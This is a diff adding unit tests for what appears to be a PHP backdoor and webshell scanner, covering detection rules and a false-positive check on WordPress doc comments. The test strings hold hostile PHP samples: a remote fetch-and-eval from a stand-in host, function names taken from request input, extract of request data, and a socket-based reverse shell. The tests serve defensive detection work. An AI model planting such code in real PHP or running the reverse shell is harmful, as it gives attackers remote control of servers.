@@ -43,6 +43,24 @@ test("catches create_function and remote-run backdoors", () => {
   assert.ok(idsFor("x.php", "<?php eval(file_get_contents('http://evil.example/x'));").includes("php.remote_include_eval"));
 });
 
+test("catches function-name-from-input backdoors and extract of input", () => {
+  assert.ok(idsFor("x.php", "<?php call_user_func($_GET['fn'], $arg);").includes("php.call_user_func_input"));
+  assert.ok(idsFor("x.php", "<?php extract($_REQUEST);").includes("php.extract_input"));
+});
+
+test("reverse shell rule needs a real shell, not a doc mention of fsockopen", () => {
+  assert.ok(idsFor("x.php", '<?php $s = fsockopen($ip, $port); exec("/bin/sh -i <&3 >&3 2>&3");').includes("php.reverse_shell"));
+  assert.ok(!idsFor("x.php", "<?php /* built on fsockopen() under the hood */ $x = 1;").includes("php.reverse_shell"));
+});
+
+test("does not false-positive on markdown backticks in PHP doc comments", () => {
+  // WordPress core is full of these. An earlier rule wrongly flagged them.
+  const doc =
+    "<?php\n/**\n * Values come from `$_POST` and `$_GET` and are validated.\n" +
+    " * Delivered via the `Sockets` class or `fsockopen()`.\n */\nfunction wp_thing() { return true; }\n";
+  assert.deepEqual(idsFor("core.php", doc), []);
+});
+
 test("recognizes known webshell family fingerprints", () => {
   assert.ok(idsFor("x.php", "// c99shell v1").includes("shell.c99"));
   assert.ok(idsFor("x.php", "$k = 'r57shell';").includes("shell.r57"));
